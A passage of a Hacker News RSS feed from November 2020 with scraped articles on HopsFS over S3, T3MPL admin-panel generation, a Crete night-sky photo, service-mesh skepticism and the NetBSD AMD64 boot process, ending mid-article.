to be rewritten as the stronger POSIX-like behaviour of hierarchical file systems (atomic move/rename, consistent file listings, consistent read-after-writes) has been replaced by weakened guarantees in S3. Even simple tasks, such as finding out what files you have, cannot be easily done on S3 when you have enough files, so a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/storage-inventory.html">new service was introduced</a> to enable you to pay extra to get a stale listing of your files. Most analytical applications (e.g., on EMR) use <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a>, instead of S3, which is a new metadata layer for S3 that provides slightly stronger guarantees than S3 - such as consistent file listings.</p><h2>File systems are making the same Journey as Databases</h2><p>The journey from a stronger POSIX-like file system to a weaker object storage paradigm and back again has parallels in the journey that databases have made in recent years. Databases made the transition from strongly consistent single-host systems (relational databases) to highly available (HA), eventually consistent distributed systems (NoSQL systems) to handle the massive increases in data managed by databases. However, <a href="https://www.singlestore.com/blog/why-nosql-databases-wrong-tool-for-modern-application/">NoSQL is just too hard for developers</a>, and databases are returning to strongly consistent (but now scalable) NewSQL systems, with databases such as Spanner, CockroachDB, SingleSQL, and MySQL Cluster.&nbsp;</p><p>In this blog, we show that distributed hierarchical file systems are completing a similar journey, going from strongly consistent POSIX-compliant file systems to object stores (with their weaker consistency models, but high availability across data centers), and back to distributed hierarchical file systems that are HA across data centers, without any loss in performance and, crucially, without any increase in cost, as we will use S3 as block storage for our file system.</p><h2>HopsFS</h2><p>HopsFS is a distributed hierarchical file system that provides a HDFS API (POSIX-like API), but stores its data in a bucket in S3. We redesigned HopsFS to (1) be <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">highly available across availability zones in the cloud</a> and (2) to <a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track">transparently use S3 to store the fileâ€™s blocks without sacrificing the file systemâ€™s semantics</a>. The original data nodes in HopsFS have now become stateless workers (part of a standard Hopsworks cluster) that include a new block caching service to leverage faster local VM storage for hot blocks. It is important to note that the cache is a global cache - not a local worker cache found in other vendorâ€™s Spark workers - that includes secure access control to the cache. In our experiments, we show that HopsFS outperforms <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a> (S3 with metadata in DynamoDB for improved performance) for IO-bound workloads, with up to 20% higher performance and delivers up to 3.4X the aggregated read throughput of EMRFS. Moreover, we demonstrate that metadata operations on HopsFS (such as directory rename or file move) are up to two orders of magnitude faster than EMRFS. Finally, HopsFS opens up the currently closed metadata in S3, enabling correctly-ordered change notifications with HopsFSâ€™ change data capture (CDC) API and customized extensions to metadata.&nbsp;</p><p>At Logical Clocks, we have leveraged HopsFSâ€™ capabilities to build the industryâ€™s first feature store for machine learning (<a href="https://docs.hopsworks.ai/">Hopsworks Feature Store</a>). The Hopsworks Feature Store is built on <a href="https://github.com/logicalclocks/hive">Hops Hive</a> and customized metadata extensions to HopsFS, ensuring strong consistency between the offline Feature Store, the online Feature Store (<a href="http://mikaelronstrom.blogspot.com/">NDB Cluster</a>), and data files in HopsFS.</p><figure id="w-node-f9d069e8e82e-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65dda6508bd64742b2b40_Screenshot%202020-11-19%20at%2012.58.07.png" loading="lazy" alt=""></p></figure><h3>Some of the key advantages of HopsFS/S3 are:</h3><h4><strong>POSIX-Like Semantics with a HDFS API</strong></h4><ul role="list"><li>Consistent file listings, consistent read-after-write, atomic rename (files/directories).</li></ul><h4><strong>Open, Extensible Metadata</strong></h4><ul role="list"><li><a href="https://hopsworks.readthedocs.io/en/stable/user_guide/hopsfs/xattrs.html">XAttr API</a> to attach arbitrary metadata to files/directories.</li></ul><h4><strong>Change Data Capture API</strong></h4><ul role="list"><li>Correctly ordered stream of file system mutation events delivered with low latency to downstream clients by <a href="https://ieeexplore.ieee.org/document/8752956">ePipe</a>.</li></ul><h4><strong>Free-Text search API for File System Namespace</strong></h4><ul role="list"><li>File system namespace metadata changes can be transparently replicated to Elasticsearch for low-latency free-text search of the namespace and its extended metadata. This service is provided by Hopsworks.</li></ul><h4><strong>X.509 Certificates for Authentication, TLS for Encryption-in-Transit</strong></h4><ul role="list"><li>HopsFS uses X.509 Certificates to identify and authenticate clients, with TLS providing end-to-end encryption-in-transit.&nbsp;</li></ul><h4><strong>Faster Metadata Operations</strong></h4><ul role="list"><li>File/directory rename/move, file listings - no limit on retrieving 1000 files-at-a-time (as in S3).&nbsp;</li></ul><h4><strong>Faster Read Operations</strong></h4><ul role="list"><li>Workers in HopsFS securely cache file blocks on behalf of clients using local VM storage. NameNodes are cache-aware and redirect clients to securely read the cached block from the correct worker.</li></ul><h4><strong>Highly Available across Availability Zones (AZs)</strong></h4><ul role="list"><li>Support for high availability (HA) across AZs through AZ-aware replication protocols.<br></li></ul><h2>HopsFS/S3 Performance</h2><p>We compared the performance of EMRFS instead of S3 with HopsFS, as EMRFS provides stronger guarantees than S3 for consisting listing of files and <a href="https://www.hatch.team/blog/post/achieving-s3-read-after-update-consistency">consistent read-after-updates</a> for objects. EMRFS uses DynamoDB to store a partial replica of S3â€™s metadata (such as what files/directories are found in a given directory), enabling faster listing of files/dirs compared to S3 and <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-plan-consistent-view.html">stronger consistency</a> (consistent file listings and consistent read-after-update, although no atomic rename) .</p><p>Here are some selected results from our peer-reviewed research paper accepted for publication at ACM/IFIP Middleware 2020. The paper includes more results than shown below, and for writes, HopsFS is on-average about 90% of the performance of EMRFS - as HopsFS has the overhead of first writing to workers who then write to S3.&nbsp; HopsFS has a global worker cache (if the block is cached at any worker, clients will retrieve the data directly from the worker)&nbsp; for faster reads and the HopsFSâ€™ metadata layer is built on NDB cluster for faster metadata operations.</p><figure id="w-node-b5601ef697cf-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65eaca9a96e19315a05e8_Screenshot%202020-11-19%20at%2013.01.36.png" loading="lazy" alt=""></p></figure><p>*Enhanced DFSIO Benchmark Results with 16 concurrent tasks reading 1GB files. For higher concurrency levels (64 tasks), the performance improvement drops from 3.4X to 1.7X.</p><p>**<a href="https://aws.amazon.com/about-aws/whats-new/2018/07/amazon-s3-announces-increased-request-rate-performance/#:~:text=Amazon%20S3%20now%20provides%20increased,time%20for%20no%20additional%20charge.">As of November 2020</a>, 3500 ops/sec is the maximum number of PUT/COPY/POST/DELETE per second per S3 prefix, while the maximum number of GET/HEAD requests per prefix is 5500 reads/sec. You can increase throughput in S3 by reading/writing in parallel to different prefixes, but this will probably require rewriting your application code and increasing the risk of bugs. For HopsFS (without S3), <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">we showed</a> that it can reach 1.6m metadata ops/sec across 3 availability zones.&nbsp;</p><p>In our <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">paper published at ICDCS</a>, we measured the throughput of HopsFS when deployed in HA mode over 3 availability zones. Using a workload from Spotify, we compared the performance with CephFS. HopsFS (1.6M ops/sec) reaches 2X the throughput of CephFS (800K ops/sec) when both are deployed in full HA mode. CephFS, however, does not currently support storing its data in S3 buckets.<br></p><h2>How do I get started with HopsFS?</h2><p>HopsFS is available as <a href="https://github.com/hopshadoop/hops">open-source</a> (Apache V2). However, cloud-native HopsFS is currently only available as part of the <a href="https://www.hopsworks.ai/">hopsworks.ai</a> platform. Hopsworks.ai is a platform for the design and operation of AI applications at scale with support for scalable compute in the form of Spark, Flink, TensorFlow, etc (comparable to Databricks or AWS EMR). You can also connect Hopsworks.ai to a Kubernetes cluster and launch jobs on Kubernetes that can read/write from HopsFS. You connect your cluster to a S3 bucket in your AWS account or on Azure to a Azure Blob Storage bucket. You can dynamically add/remove workers to/from your cluster, and the workers act as part of the HopsFS cluster - using minimal resources, but reading/writing to/from S3 or ABS on behalf of clients, providing access control, and caching blocks for faster retrieval.</p><h3>References</h3><ul role="list"><li>Ismail Mahmoud, Salman Niazi, Gautier Berthou, â€¦</li></ul></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3">https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3</a></em></p>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149154</guid>
            <pubDate>Thu, 19 Nov 2020 13:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generate Admin Panel for Your Static Website with T3MPL]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149099">thread link</a>) | @b4rtazz
<br/>
November 19, 2020 | https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/ | <a href="https://web.archive.org/web/*/https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<header>
		<h2><a href="https://t3mpl.n4no.com/">&lt;/&gt; T3MPL</a></h2>

		<nav>
			<ul>
				<li>
					<a href="https://t3mpl.n4no.com/docs/">Docs</a>
				</li>
				<li>
					<a href="https://t3mpl.n4no.com/donate/">Donate</a>
				</li>
				<li>
					<a href="https://github.com/b4rtaz/t3mpl-editor" targe="_blank">GitHub</a>
				</li>
				<li>
					<a href="https://t3mpl.n4no.com/editor/#manifest=../templates/t3mpl-one/template.yaml">Editor</a>
				</li>
			</ul>
		</nav>
	</header>

<div>
	<article>
		<p><img src="https://t3mpl.n4no.com/content/image/5841gmvz8i7y8mycchzx.png" alt="Generate Website Admin Panel"></p>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="ğŸ¹-template-contract">ğŸ¹ Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="ğŸ‘“-template">ğŸ‘“ Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="ğŸ’¥-generic-editor">ğŸ’¥ Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="ğŸš€-publishing">ğŸš€ Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="ğŸ“£-summary">ğŸ“£ Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>
<p>At the end, you may also check:</p>
<ul>
<li><a href="https://github.com/b4rtaz/t3mpl-templates">Free T3MPL Templates repository</a> (many examples)</li>
<li><a href="https://github.com/b4rtaz/t3mpl-editor">T3MPL Editor repository</a></li>
<li><a href="https://github.com/b4rtaz/t3mpl-server">T3MPL Server repository</a></li>
<li><a href="https://t3mpl.n4no.com/">Online T3MPL Editor</a></li>
</ul>
<p><em>â€” Written by <a href="https://twitter.com/b4rtaz">b4rtaz</a></em></p>

	</article>
</div>

</div></div>]]>
            </description>
            <link>https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149099</guid>
            <pubDate>Thu, 19 Nov 2020 13:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Millennials, the Dying Children]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25149073">thread link</a>) | @krebs_liebhaber
<br/>
November 19, 2020 | https://lexic.co/barfblog/millennials-dying-children | <a href="https://web.archive.org/web/*/https://lexic.co/barfblog/millennials-dying-children">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lexic.co/barfblog/millennials-dying-children</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149073</guid>
            <pubDate>Thu, 19 Nov 2020 13:08:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Light and Glory over Crete]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25148776">thread link</a>) | @jayass
<br/>
November 19, 2020 | https://misspellede.com/us/light-and-glory-over-crete/ | <a href="https://web.archive.org/web/*/https://misspellede.com/us/light-and-glory-over-crete/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <div> 
                            <p><img loading="lazy" src="https://apod.nasa.gov/apod/image/2011/CreteSky_Slovinsky_1080.jpg" alt="Light and Glory over Crete cover image"></p>
            <p><a href="https://misspellede.com/us/cosmos/">cosmos</a></p><p>TomÃ¡Å¡ SlovinskÃ½ â€¢ 2020-11-16</p><h2>Greek island of Crete</h2>



<p>The month was July, the place was the Greek island of Crete, and the sky was spectacular. Of course there were the usual stars like Polaris, Vega, and Antares -- and that common asterism everyone knows: the Big Dipper. </p>



<p>But this sky was just getting started. The band of the Milky Way Galaxy stunned as it arched across the night like a bridge made of stars and dust but dotted with red nebula like candy. The planets Saturn and Jupiter were so bright you wanted to stop people on the beach and point them out. </p>



<p>The air glowed like a rainbow -- but what really grabbed the glory was a comet. Just above the northern horizon, Comet NEOWISE spread its tails like nothing you had ever seen before or might ever see again. Staring in amazement, there was only one thing to do: take a picture. </p>



<p><span>Coverage: NASA's SpaceX Crew-1 Mission</span></p>

        </div>
    </article></div>]]>
            </description>
            <link>https://misspellede.com/us/light-and-glory-over-crete/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25148776</guid>
            <pubDate>Thu, 19 Nov 2020 12:23:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don't need no service mesh]]>
            </title>
            <description>
<![CDATA[
Score 82 | Comments 35 (<a href="https://news.ycombinator.com/item?id=25148642">thread link</a>) | @SerCe
<br/>
November 19, 2020 | https://serce.me/posts/23-07-2020-you-dont-need-no-service-mesh/ | <a href="https://web.archive.org/web/*/https://serce.me/posts/23-07-2020-you-dont-need-no-service-mesh/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Hi!</p>
<p>Service meshes have attracted an enormous amount of hype around them. With at least a few talks about service meshes during each tech conference, one can easily be convinced that having a service mesh in their infrastructure is a must. However, hype isnâ€™t a good indicator of whether the new shiny tech is the right solution for your problems. So below, Iâ€™ll try to express an anti-hype opinion on service meshes to hopefully make it less confusing when you want to decide whether you may or may not need one.</p>
<p><span><img src="https://serce.me/img/servicemesh/rick.png" alt="rick"></span></p>
<div>
<blockquote>
<p>Thereâ€™s a lesson here, and Iâ€™m not going to be the one to figure it out.</p>
</blockquote>
<p>
â€” Rick Sanchez
</p>
</div>
<div>
<h3 id="_the_invention">The invention</h3>
<p>Letâ€™s take a step back in history and take a look at one of the <a href="https://eng.lyft.com/envoy-7-months-later-41986c2fd443">early articles</a> about introducing Envoy at Lyft.</p>
<div>
<blockquote>
<p>As it turns out, almost every company with a moderately-sized service oriented architecture is having the same problems that Lyft did prior to the development and deployment of Envoy:</p>
<div>
<ul>
<li>
<p>An architecture composed of a variety of languages, each containing a half-baked RPC library, including partial (or zero) implementations of rate limiting, circuit breaking, timeouts, retries, etc.</p>
</li>
<li>
<p>Differing or partial implementations of stats, logging, and â€¦.</p>
</li>
</ul>
</div>
</blockquote>
</div>
<p>While Envoy is not a service mesh by itself, the outlined problems describe the exact reason why service meshes were invented. They add â€œrate limiting, circuit breaking, â€¦â€ and other reliability, observability, and security features to the services by enforcing the communication to go through the service mesh proxies, a data plane. Additionally, they require a separate component, a control plane, to control the configuration.</p>
<p>However, at this point, a lot of people miss the context in which service meshes were introduced. Service meshes are able to solve the problem not because itâ€™s impossible to solve them in any other way. There are many battle-proof RPC libraries that take on the challenges of a separate data plane layer, <a href="https://github.com/twitter/finagle">Finagle</a>, <a href="https://github.com/grpc">gRPC</a>, <a href="https://github.com/line/armeria">Armeria</a>, <a href="https://github.com/apple/servicetalk">Servicetalk</a>, to name a few. After all, the very first service mesh - Linkerd 1.0 <a href="https://github.com/linkerd/linkerd">is powered by Finagle</a>. The RPC libraries will need a component which provides service discovery and configuration management to make it a true mesh. For instance, Zookeeper, or Consul, a component that service meshes call a control plane.</p>
<p>Why introduce a new concept to solve the problems that have been solved before? The service mesh concept wasnâ€™t introduced to address problems that hadnâ€™t been addressed before but rather address them in a way that doesnâ€™t require any modifications to the application code, which is incredibly convenient when itâ€™s hard to introduce an RPC layer into an existing heterogeneous microservice environment.</p>
<p>When you hear service mesh, Istio with Envoy might be the first thing that comes to mind, but it wasnâ€™t the first service mesh to enter the market. Linkerd authors who pioneered the space, described exactly this situation in the <a href="https://linkerd.io/2017/04/25/whats-a-service-mesh-and-why-do-i-need-one/#why-is-the-service-mesh-necessary">"why is the service mesh necessary"</a>. Interestingly, in many hype-y articles on the Internet this context is often forgotten, or omitted.</p>
<p>Solving a problem well, even if itâ€™s a problem that a lot of people have, doesnâ€™t magically provide the tech with a lot of hype. There is always a sponsor behind it. I donâ€™t know who the sponsor was here, and Iâ€™m going to speculate, but itâ€™s hard to sell an RPC library in the world where open source is a fundamental requirement. There is no clear business model there, thatâ€™s why most of the mature RPC libraries were open-sourced by large tech companies for which itâ€™s not a part of the core business model. A library is just code, not a piece of infrastructure. Service meshes are a different story. Itâ€™s an isolated non-trivial piece of infrastructure. As a vendor, not only can you provide consultancy around the configuration and deployment, but you can also sell complete hosted solutions around it.</p>
</div>
<div>
<h3 id="_disillusionments">Disillusionments</h3>
<p>Now that weâ€™ve established the problems, the solution, and most importantly, the context in which the solution was made, letâ€™s take a look at the alternatives. The most obvious one, in the spirit of KISS, is to use an RPC library for your preferred language. Here is where the context is crucial: if you have a large fleet of services, each written in its own language/ecosystem, and the only language that they share is HTTP then having a single shared RPC library is going to be hard. Perhaps, youâ€™ve got a fabric of deployed and running services, but everyone is afraid of touching them, no one knows how they work, and each redeploy is an adventure. A service mesh is here to help you, because at least youâ€™ll be able to roll out new infrastructure features to the mesh regularly.</p>
<p>On the other hand, if you have a fleet of healthy services written in a single application stack, then itâ€™s a good idea to think twice before introducing a service mesh. By simply introducing or evolving a shared RPC library, youâ€™ll get the exact same benefits and avoid dealing with the downsides of maintaining service meshes. By studying the service mesh limitations thoroughly, you can avoid finding yourself in the trough of disillusionment.</p>
<p><span><img src="https://serce.me/img/servicemesh/curve.png" alt="Hype Cycle"></span></p>
<div>
<h4 id="_different_ecosystem">Different ecosystem</h4>
<p>The ecosystem of the service mesh of your choice will likely be different from the ecosystem of your services. Beautiful websites always make you believe that the solution is plugâ€™nâ€™play, always works and never goes down. In reality, sooner or later problems, bugs, quirks in behaviour will reveal themselves, as they always do. At that point, youâ€™ll need to have engineers who work on the service-meshâ€™s ecosystem which when itâ€™s different from the main app, effectively limits the set of people who can introduce changes or fix problems. This is likely to reintroduce silos, which is against the whole DevOps spirit. Yes, having a DevOps team of engineers who are doing DevOps-y things <a href="https://continuousdelivery.com/2012/10/theres-no-such-thing-as-a-devops-team/">is against DevOps</a>.</p>
</div>
<div>
<h4 id="_unnecessary_overhead">Unnecessary overhead</h4>
<p>Not only having a proxy in front of each service adds overhead (often significant, talking about <a href="https://istio.io/latest/docs/ops/deployment/performance-and-scalability/">90pt</a> rather than 99pt in the performance summary <a href="https://www.infoq.com/presentations/latency-response-time/">doesnâ€™t make software run faster</a>) and consumes resources, but you also requires time (or rather a team of people) to manage them. Yes, it can help to make some of the tasks potentially easier - yay, you can now add canary deployments with a few lines of YAML to simple applications now. However, you still need to manage canary deployments of the proxies themselves which donâ€™t have a proxy in front of them. The problems just get pushed up the stack.</p>
</div>
<div>
<h4 id="_limiting_your_architecture_to_what_the_proxy_supports">Limiting your architecture to what The Proxy supports.</h4>
<p>As youâ€™re reading this paragraph, HTTP/3 is slowly being rolled out to the Internet. It uses UDP as transport. Why use UDP rather than create a completely new protocol you ask? Thatâ€™s because anything but TCP and UDP is simply â€œblockedâ€ by the boxes, various proxies on the internet - routers, gateways, etc. This phenomenon got named <a href="https://http3-explained.haxx.se/en/why-quic/why-ossification">ossification</a>. So, only TCP or UDP are left is the practical chose, and even UDP is partially blocked by various corporate proxies which slows down the adoption.</p>
<p>Even though your microservice environment is probably much smaller compared to the Internet, you can draw parallels with service meshes. Proxies can ossify your application architecture by limiting how your services talk to each other, and there is not much benefit in having proxies if you can bypass them. Suppose you want to build a reactive application which is using RSocket over pure tcp? Or perhaps a message-driven application using an actor model? Or maybe push the performance boundaries with Aeron? Not going to happen until the box in the middle becomes aware of the protocol.</p>
</div>
</div>
<div>
<h3 id="_do_i_need_one">Do I need one?</h3>
<p>What does it all mean for you as an engineer? The answer to whether you need to adopt the service mesh approach comes down to the state of the microservice environment youâ€™re trying to improve. As we have established, compared to an RPC framework, service meshes allow you to:</p>
<div>
<ol>
<li>
<p>Deploy the infra changes more often than deploying your services.</p>
</li>
<li>
<p>Introduce infra changes without touching the service code.</p>
</li>
</ol>
</div>
<p>The point 1. is important when for whatever reason you canâ€™t redeploy your services very often, e.g. maybe no one remembers how itâ€™s done anymore, or maybe there are other restrictions. The point 2. is important when your stack is heterogeneous, e.g. some services are built in Go, some in Java, some in Haskell, etc. Where are you on the interval from a huge set of heterogeneous services with unknown deployment schedules to a set of homogenous regularly deployed services defines whether a service mesh is the best solution for you.</p>
</div>
<div>
<h3 id="_conclusion">Conclusion</h3>
<p>Service meshes have a lot of hype around them, and way too much in my opinion. However, before committing to a piece of technology, itâ€™s crucial to understand the problems it solves, and the context in which the solution was made. A service mesh is not an ultimate â€œgood practiceâ€ but simply one of the patterns to solve a set of issues, and itâ€™s quite a heavy one.</p>
<p>Rather than jumping on board, look carefully - the last thing you want is to find out that you have invested in a solution for a problem that you donâ€™t have. Service meshes are an amazing piece of tech solving a whole lot of problems. Not in every case, it is the best solution.</p>
</div>
<div>
<h3 id="_thank_you_to">Thank you to</h3>
<div>
<ul>
<li>
<p>You for reading this article.</p>
</li>
<li>
<p><a href="https://twitter.com/ptuls">Paul Tune</a> for reviewing the article.</p>
</li>
</ul>
</div>
</div>
<div>

<hr>
<blockquote><p lang="en" dir="ltr">"You don't need no Service Mesh". Just published a new blog post with an anti-hype opinion on the over-hyped topic. <a href="https://t.co/SVXS3nWKzj">https://t.co/SVXS3nWKzj</a></p>â€” Sergey Tselovalnikov (@SerCeMan) <a href="https://twitter.com/SerCeMan/status/1286242507664191488?ref_src=twsrc%5Etfw">July 23, 2020</a></blockquote> 
</div>

</div></div>]]>
            </description>
            <link>https://serce.me/posts/23-07-2020-you-dont-need-no-service-mesh/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25148642</guid>
            <pubDate>Thu, 19 Nov 2020 12:00:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Before the BSD Kernel Starts: Part One on AMD64]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25148455">thread link</a>) | @fcambus
<br/>
November 19, 2020 | https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>System initialization is one of the niche areas that few people look into.
The exact details vary considerably between different platforms, firmwares, CPU architectures and operating systems, making it difficult to learn it all.
Usually, if something is not working correctly during the early stages of system startup or if the OS does not boot, it rarely has anything to do with the code responsible for booting. Most of the time, it is due to other factors, such as the boot media or BIOS configuration.
However, understanding the early initialization process may help debug or to familiarize yourself with a new platform or hardware.</p>

<p>In this article, I will walk through the early kernel initialization process, defining the meaning of this term.
System initialization is a broad topic that ranges from the platformâ€™s hardware design all the way up to typical functions of an operating system such as handling I/O operations.
It is not possible to cover the entire topic adequately within the scope of an article. In this first part I will describe the well-known AMD64: 64-bit platform. I am going to highlight a very interesting part of the initialization process the early initialization of the kernel.
Later, I will compare it with ARM64. In both cases I will discuss the topic in the context of NetBSD, the operating system known for its portability.</p>

<h2 id="the-bigger-picture">The Bigger Picture</h2>

<p>The CPU starting point is called the reset vector: the CPU bootstraps, then fetches and executes the first physical address at location <code>0xFFFFFFF0</code>. The bootloader must always contain a jump to the initialization code in these last top 16 bytes. The CPU is in a variant of a real mode called unreal-mode. 16-bit addressing with segments can address up to 1 MiB of memory.
After the reset, the CS descriptor cache base field contains a special fixed 32-bit value: <code>0xFFFF 0000</code>. (In real-mode a user can change only the lower 16 bits of CS; the upper half, also called the base, is set on reset and hidden).
Using this technique, the instruction pointer addresses relative to the last 64 KiB fragment of the physical memory, which is usually wired to read-only flash memory, where part of the platform firmware (BIOS/UEFI) is located.</p>

<h3 id="bios-or-uefi">BIOS or UEFI?</h3>

<p>BIOS (Basic Input/Output System) is a term used for legacy platform initialization firmware and an interface between the operating system and platform.
It is used mostly with IBM PC compatible machines, such as personal computers or server type machines.
On the other hand, UEFI (Unified Extensible Firmware Interface) is a generic specification, not a particular implementation, and similarly to the BIOS defines an interface between the operating system and platform firmware. The goal of UEFI is to replace legacy interfaces, also is designed to be universal, it can be applied to PCâ€™s or servers as well as embedded devices.
This newer standard was developed to overcome limitations of older standards such as 16-bit processor mode with 1 MB of addressable space, or maximum hard drive sizes from which the operating system can be booted. It also brings new features like secure boot or UEFI runtime services.
Describing UEFI and how it differs from BIOS is out of the scope of this article, but what is important to know is that both BIOS and UEFI based firmware will perform platform initialization, and later load the operating system from the physical medium.
The way that the system is loaded differs between UEFI and BIOS. The newer standard allows for more advanced functionalities, such as GPT partition layout where the BIOS operates on boot sectors. For this article, we will start with the legacy boot process based on Master Boot Record (MBR). The topic of UEFI can be extended in the future if needed.</p>

<h3 id="legacy-bios">Legacy BIOS</h3>

<p>When the CPU starts after reset, most of the platform hardware is not ready to use: system memory connected as a DIMMs modules is not yet detected and initialized, timers and interrupts arenâ€™t ready, nor is the PCI bus working yet.
Hardware has to be initialized, and that is the essential role of platform firmware. A more detailed description of initialization process can be found by a curious reader in Minimal Boot Loader for IntelÂ® Architecture, here I will point out only the critical functionalities.
At the beginning, firmware initialization code needs to initialize the CPU and platform chipsets can only then prepare memory to work.
After the memory is operational in a phase called post memory initialization, the firmware copies itself from the slow flash memory to the system DRAM. Initialization code can start execution only after it prepares software environment as stack or the CPU mode.
When the CPU jumps to memory address below 1MB in the DRAM (this memory region is historically reserved for that purpose), it still has many things to do before it is be able to communicate with external devices.
At the latest phase, IO devices are initialized as well as the PCI bus is enumerated. Once that is done, initialization code will search for a legacy operating system to boot, load the MBR sector from disk to the memory and execute it.</p>

<p>BIOS loads the first sector, called the MBR (512 bytes), from the beginning of the hard disk. That region must end with the magic number (also called a signature) 0xAA55. This sector contains instructions that have to load further sectors into the memory to execute a higher-level bootstrap program for a simple reason: size and how many instructions can fit into 512 bytes.
Only in that way can we have a more complex program that will find and execute the kernel of the operating system.
Before I describe the process of executing kernel and making it operational in the long mode, we need to know what the starting point of a typical UNIX kernel is.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Loading_MBR_2_gxwj0i.svg" alt="Master Boot Record"></p>

<h2 id="the-kernel-is-an-elf-file">The Kernel is an ELF file</h2>

<p>The two most common executable file formats are ELF (Executable and Linkable Format) and PE (Portable Executable).
In the UNIX environment, ELF is the typical format for program binaries, while PE is widely used on Windows.
It should not be a surprise to the reader that the NetBSD kernel is also ELF executable.</p>

<h3 id="before-the-main">Before the main</h3>

<p>We are used to thinking that programs start with some kind of <code>main</code> function. Those of us who have studied libraries or flow of execution can recall a lower level <code>_start</code> function that was called when the program was loaded into memory. In ELF executables, the program actually starts at an entry point that is defined inside the header of the file (<code>Entry point address</code>).
We can easily verify this claim using the readelf program on our kernel binary:</p>

